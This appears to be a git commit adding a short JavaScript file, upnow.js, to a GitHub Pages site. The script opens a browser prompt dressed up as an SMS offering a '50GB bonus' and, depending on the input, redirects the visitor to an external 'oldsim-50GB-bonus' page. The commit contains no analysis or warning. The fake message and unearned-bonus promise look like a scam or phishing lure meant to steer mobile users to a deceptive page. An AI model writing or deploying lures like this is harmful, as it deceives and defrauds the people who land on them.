6f5029a24a17cd00a69701b52a480fac4914ab46
everylinks <Joeyjosh60@gmail.com>
2024-12-24 13:07:02 +0100

    Create upnow.js

---
+++ upnow.js
@@ -0,0 +1,6 @@
+
+var password = '50GB BONUS'
+password=prompt('SMS :Congratulations check if you are eligible for 50GB bonus, click OK to check  ','50GB BONUS');
+if (password != '50GB BONUS') {
+location.href='https://everylinks.github.io/oldsim-50GB-bonus';
+}
